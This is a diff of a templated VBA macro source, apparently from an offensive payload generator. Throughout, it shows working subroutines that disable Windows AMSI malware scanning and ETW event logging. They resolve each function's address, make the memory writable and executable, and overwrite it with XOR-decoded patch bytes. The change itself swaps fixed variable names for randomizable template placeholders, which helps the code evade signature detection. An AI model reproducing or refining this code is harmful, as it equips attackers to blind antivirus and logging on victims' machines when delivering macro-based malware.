@@ -24,38 +24,38 @@ End Function
 
 Private Sub {{ v.fn_amsi_patch }}()
     On Error Resume Next
-    Dim amsiLib As String: amsiLib = {{ v.vba_amsi_dll }}
-    Dim scanName As String: scanName = {{ v.vba_amsi_scan_buf }}
-    Dim amsiBase As LongPtr: amsiBase = {{ v.fn_loadlib }}(amsiLib)
-    If amsiBase = 0 Then Exit Sub
-    Dim scanAddr As LongPtr: scanAddr = {{ v.fn_getprocaddr }}(amsiBase, scanName)
-    If scanAddr = 0 Then Exit Sub
-    Dim oldP As Long
-    {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, &H40, VarPtr(oldP)
+    Dim {{ v.vba_lv_amsilib }} As String: {{ v.vba_lv_amsilib }} = {{ v.vba_amsi_dll }}
+    Dim {{ v.vba_lv_scanname }} As String: {{ v.vba_lv_scanname }} = {{ v.vba_amsi_scan_buf }}
+    Dim {{ v.vba_lv_amsibase }} As LongPtr: {{ v.vba_lv_amsibase }} = {{ v.fn_loadlib }}({{ v.vba_lv_amsilib }})
+    If {{ v.vba_lv_amsibase }} = 0 Then Exit Sub
+    Dim {{ v.vba_lv_scanaddr }} As LongPtr: {{ v.vba_lv_scanaddr }} = {{ v.fn_getprocaddr }}({{ v.vba_lv_amsibase }}, {{ v.vba_lv_scanname }})
+    If {{ v.vba_lv_scanaddr }} = 0 Then Exit Sub
+    Dim {{ v.vba_lv_amsioldp }} As Long
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, {{ v.vba_lv_scanaddr }}, 6, &H40, VarPtr({{ v.vba_lv_amsioldp }})
     Dim {{ v.var_amsi_patch }}(0 To 5) As Byte
     {{ v.var_amsi_patch }}(0) = &H{{ amsi_enc_bytes[0] }}: {{ v.var_amsi_patch }}(1) = &H{{ amsi_enc_bytes[1] }}: {{ v.var_amsi_patch }}(2) = &H{{ amsi_enc_bytes[2] }}: {{ v.var_amsi_patch }}(3) = &H{{ amsi_enc_bytes[3] }}: {{ v.var_amsi_patch }}(4) = &H{{ amsi_enc_bytes[4] }}: {{ v.var_amsi_patch }}(5) = &H{{ amsi_enc_bytes[5] }}
     Dim {{ v.var_amsi_xk }} As Byte: {{ v.var_amsi_xk }} = &H{{ amsi_xor_key }}
     Dim {{ v.var_amsi_pi }} As Long: For {{ v.var_amsi_pi }} = 0 To 5: {{ v.var_amsi_patch }}({{ v.var_amsi_pi }}) = {{ v.var_amsi_patch }}({{ v.var_amsi_pi }}) Xor {{ v.var_amsi_xk }}: Next
-    {{ v.fn_callwp }} {{ v.fn_movemem }}, scanAddr, VarPtr({{ v.var_amsi_patch }}(0)), 6, 0
-    {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, oldP, VarPtr(oldP)
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, {{ v.vba_lv_scanaddr }}, VarPtr({{ v.var_amsi_patch }}(0)), 6, 0
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, {{ v.vba_lv_scanaddr }}, 6, {{ v.vba_lv_amsioldp }}, VarPtr({{ v.vba_lv_amsioldp }})
 End Sub
 
 Private Sub {{ v.fn_etw_patch }}()
     On Error Resume Next
-    Dim ntdllName As String: ntdllName = {{ v.vba_ntdll_dll }}
-    Dim etwName As String: etwName = {{ v.vba_etw_event_write }}
-    Dim ntdllBase As LongPtr: ntdllBase = {{ v.fn_loadlib }}(ntdllName)
-    If ntdllBase = 0 Then Exit Sub
-    Dim etwAddr As LongPtr: etwAddr = {{ v.fn_getprocaddr }}(ntdllBase, etwName)
-    If etwAddr = 0 Then Exit Sub
-    Dim oldP As Long
-    {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, &H40, VarPtr(oldP)
+    Dim {{ v.vba_lv_ntdllname }} As String: {{ v.vba_lv_ntdllname }} = {{ v.vba_ntdll_dll }}
+    Dim {{ v.vba_lv_etwname }} As String: {{ v.vba_lv_etwname }} = {{ v.vba_etw_event_write }}
+    Dim {{ v.vba_lv_ntdllbase }} As LongPtr: {{ v.vba_lv_ntdllbase }} = {{ v.fn_loadlib }}({{ v.vba_lv_ntdllname }})
+    If {{ v.vba_lv_ntdllbase }} = 0 Then Exit Sub
+    Dim {{ v.vba_lv_etwaddr }} As LongPtr: {{ v.vba_lv_etwaddr }} = {{ v.fn_getprocaddr }}({{ v.vba_lv_ntdllbase }}, {{ v.vba_lv_etwname }})
+    If {{ v.vba_lv_etwaddr }} = 0 Then Exit Sub
+    Dim {{ v.vba_lv_etwoldp }} As Long
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, {{ v.vba_lv_etwaddr }}, 4, &H40, VarPtr({{ v.vba_lv_etwoldp }})
     Dim {{ v.var_etw_patch }}(0 To 3) As Byte
     {{ v.var_etw_patch }}(0) = &H{{ etw_enc_bytes[0] }}: {{ v.var_etw_patch }}(1) = &H{{ etw_enc_bytes[1] }}: {{ v.var_etw_patch }}(2) = &H{{ etw_enc_bytes[2] }}: {{ v.var_etw_patch }}(3) = &H{{ etw_enc_bytes[3] }}
     Dim {{ v.var_etw_xk }} As Byte: {{ v.var_etw_xk }} = &H{{ etw_xor_key }}
     Dim {{ v.var_etw_pi }} As Long: For {{ v.var_etw_pi }} = 0 To 3: {{ v.var_etw_patch }}({{ v.var_etw_pi }}) = {{ v.var_etw_patch }}({{ v.var_etw_pi }}) Xor {{ v.var_etw_xk }}: Next
-    {{ v.fn_callwp }} {{ v.fn_movemem }}, etwAddr, VarPtr({{ v.var_etw_patch }}(0)), 4, 0
-    {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, oldP, VarPtr(oldP)
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, {{ v.vba_lv_etwaddr }}, VarPtr({{ v.var_etw_patch }}(0)), 4, 0
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, {{ v.vba_lv_etwaddr }}, 4, {{ v.vba_lv_etwoldp }}, VarPtr({{ v.vba_lv_etwoldp }})
 End Sub
 
 Private Function {{ v.fn_hex2arr }}(hex As String) As Byte()
